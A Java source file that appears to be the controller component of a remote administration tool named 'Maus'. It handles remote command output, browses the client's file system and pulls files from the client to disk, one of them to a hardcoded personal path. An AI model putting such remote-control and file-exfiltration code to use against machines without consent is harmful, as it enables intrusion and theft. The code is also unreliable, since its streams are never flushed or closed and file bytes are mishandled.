package Server;

import GUI.Components.FileContextMenu;
import GUI.Controller;
import GUI.ResizeHelper;
import GUI.Views.FileExplorerView;
import GUI.Views.SendCommandView;
import Logger.Level;
import Logger.Logger;
import Server.Data.PseudoBase;
import Server.Data.Repository;
import javafx.application.Platform;
import javafx.scene.Scene;
import javafx.stage.Stage;
import javafx.stage.StageStyle;

import java.io.*;

class ProcessCommands implements Repository {

    static void processCommands(InputStream is, ClientObject client) throws IOException {
        DataInputStream dis = new DataInputStream(is);
        final Stage[] fileExplorer = {null};
        while (true) {
            String input;
            try {
                input = dis.readUTF();
            } catch (EOFException e) {
                Logger.log(Level.ERROR, e.toString());
                break;
            }
            if (input.contains("CMD")) {
                int outputCount = dis.readInt();
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < outputCount; i++) {
                    sb.append(dis.readUTF()).append("\n");
                }
                SendCommandView.getConsole().appendText(sb.toString());
            } else if (input.contains("DIRECTORYUP")) {
                client.clientCommunicate("FILELIST");
            } else if (input.contains("CHNGDIR")) {
                client.clientCommunicate("FILELIST");
            } else if (input.contains("FILELIST")) {
                String pathName = dis.readUTF();
                int filesCount = dis.readInt();
                String[] fileNames = new String[filesCount];
                for (int i = 0; i < filesCount; i++) {
                    fileNames[i] = dis.readUTF();
                }
                Platform.runLater(() -> {
                    if (fileExplorer[0] == null) {
                        fileExplorer[0] = new Stage();
                        fileExplorer[0].setMinWidth(400);
                        fileExplorer[0].setMinHeight(400);
                        fileExplorer[0].initStyle(StageStyle.UNDECORATED);
                        fileExplorer[0].setScene(new Scene(new FileExplorerView().getFileExplorerView(pathName, fileNames, fileExplorer[0], client), 900, 500));
                        ResizeHelper.addResizeListener(fileExplorer[0]);
                        fileExplorer[0].show();
                    }
                    fileExplorer[0].setScene(new Scene(new FileExplorerView().getFileExplorerView(pathName, fileNames, fileExplorer[0], client), 900, 500));
                });
            } else if (input.contains("DOWNLOAD")) {
                String saveDirectory = FileContextMenu.selectedDirectory;
                long fileLength = dis.readLong();
                String fileName = dis.readUTF();
                File downloadedFile = new File(saveDirectory + "/" + fileName);
                FileOutputStream fos = new FileOutputStream(downloadedFile);

                BufferedOutputStream bos = new BufferedOutputStream(fos);
                for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
            } else if (input.contains("FILES")) {
                int filesCount = dis.readInt();
                File[] files = new File[filesCount];
                for (int i = 0; i < filesCount; i++) {
                    long fileLength = dis.readLong();
                    String fileName = dis.readUTF();

                    files[i] = new File("C:/Users/caden/Desktop/DIDITWORK" + "/" + fileName);

                    FileOutputStream fos = new FileOutputStream(files[i]);
                    BufferedOutputStream bos = new BufferedOutputStream(fos);

                    for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
                }
            }
            /* Uninstall and close remote server - remove from Maus */
            else if (input.contains("EXIT")) {
                PseudoBase.getMausData().remove(client.getIP());
                CONNECTIONS.remove(client.getIP());
                Controller.updateStats();
                Controller.updateTable();
                client.getClient().close();
                break;
            }
        }
    }
}
